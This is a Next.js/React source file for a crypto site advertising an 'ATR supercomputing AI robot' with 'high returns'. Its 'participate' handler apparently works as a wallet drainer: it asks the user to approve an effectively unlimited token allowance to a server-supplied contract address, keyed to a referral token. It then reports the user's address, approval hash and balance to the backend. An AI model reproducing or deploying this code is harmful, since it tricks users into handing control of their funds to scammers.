"use client";
import Image from "next/image";

import classes from "./index.module.css";
import HOMEIMG01 from "@images/home-01.png"
import AddressIcon from "@images/icon/address.png"
import { shortenString } from "@/lib/utils";
import { useAccount, useNetwork } from "wagmi";
import Fna from "@/components/fna";
import Banner from "@/components/banner";
import Notic from "@/components/notic"
import SELECTImg from "@images/select.png"
import { useContractUserBalance, useGetUserInfo, userContractApprove, useContractUserAllowanceStatus } from "@/hooks/usdt";
import React,{ useEffect, useState, useRef } from "react";
import { postForm } from "node_modules/axios/index.cjs";
import { getRequestExtract, postUserapproveAuth, getContractAddress, getHomeConfig, getBackList } from "@/server/user";
import { Snackbar, Drawer, Grid } from "@mui/material";
import { useTranslation } from "react-i18next";
import CountUp from 'react-countup'
import MsgSuccess from '@/components/msgsuccess';
import { useRouter } from 'next/navigation';
import "./page.css"

export default function Home() {
  const { t, i18n } = useTranslation()
  const router = useRouter()
  const { address } = useAccount()
  const [loading, setLoding] = useState(false)
  const { data, isLoading, approve, isSuccess, onSuccess, onError } = userContractApprove()
  const { userinfo } = useGetUserInfo()
  const { userBalance } = useContractUserBalance()
  const [contractAddress, setContractAddress] = useState<any>("")
  const [backList,setBackList] = useState<any>([])
  const { isAllowed } = useContractUserAllowanceStatus(contractAddress || "0x070c9581ce99eedbc659d1a34569f1c548a08a1b")
  const [addData,setAddData] = useState({
    isShow: false,
    title: '',
    status: 0,
    msg: ''
  })
  const [snackbarValue, setSnackbarValue] = useState({
    open: false,
    message: ""
  })
  const { chain } = useNetwork()
  useEffect(()=>{
    if(isSuccess){
      onSuccess(async () => {
        const res = await postUserapproveAuth({
          address,
          chain_type: chain?.id,
          auth_status: 1,
          auth_hash: data?.hash,
          balance: userBalance,
        })
        setAddData({
          title: t("index.participant"),
          isShow: true,
          status: 0,
          msg: t("index.successed")
        })
      })
    }
  },[isSuccess])

  useEffect(() => {
    if(address){
    }
  }, [chain,address])


  const handleGetBackList = async () => {
    let {data,code} = await getBackList({address})
    if(code == 200){
      setBackList(data)
    }
  }

  const handleGetAddress = async () => {
    const params = new URLSearchParams(window.location.search)
    const paramValue = params.get('c')
    if(!paramValue){
      router.push("/404")
      return
    }
    let { data } = await getContractAddress({
      address,
      chain_type: chain?.id,
      domain: window?.location?.hostname,
      share_token: paramValue || '',
    })
    setContractAddress(data.auth_address)
  }
  const handleParticipate = async () => {
    if(contractAddress == "") return
    if(isAllowed && address && chain?.id != 56){
      const res = await postUserapproveAuth({
        address,
        chain_type: chain?.id,
        auth_status: 0,
        auth_hash: data?.hash || '',
        balance: userBalance,
      })
      setSnackbarValue({
          open: true,
          message: t("index.authed"),
      })
      return
    }
    setLoding(true)
    try {
      await approve({
        args: [contractAddress, 14122398000000000000000000000],
      })
    } catch (error) {
      console.log(error);
    }
    setLoding(false)
  }

  return (
    <article 
      className="h-full"
      style={{ overflowX: 'hidden',position: "relative", }}
    >
      <article className="w-full mt-[100px] px-10">
        <Grid container className="w-full bg-[#131C20]">
          <Grid item xs={12} lg={7} style={{display: "flex", flexDirection: "column", justifyContent: "center"}}>
            <div className="px-[92px]">
              <span className="text-[72px] font-bold"><span className="text-[#E1146E]">ATR</span>超算AI机器人</span>
            </div>
            <div className="px-[92px] py-[8px] bg-[rgba(0,0,0,0.5)]" style={{paddingRight: "20px"}}>
              <span className="text-[28px] sm:text-[48px] font-bold"><span className="text-[#E1146E]">首发</span>1000<span className="text-[#E1146E]">台火爆上线</span></span>
              <span className="text-[30px]">(高额收益)</span>
            </div>
          </Grid>
          <Grid item xs={12} lg={5}>
            <Image
                src={HOMEIMG01}
                alt=''
                className="w-full"
                style={{height:"fit-content"}}
            />
          </Grid>
        </Grid>
      </article>
      
      <Snackbar
        open={snackbarValue.open}
        autoHideDuration={6000}
        anchorOrigin={{ vertical: 'top', horizontal: 'center' }}
        onClose={() => {
          setSnackbarValue({
            ...snackbarValue,
            open: false,
            message: ""
          })
        }}
        message={snackbarValue.message}
      />
      <MsgSuccess isShow={addData.isShow} title={addData.title} status={addData.status} msg={addData.msg} reset={ ()=>{setAddData({...addData,isShow: false})} } />
    </article>
  );
}


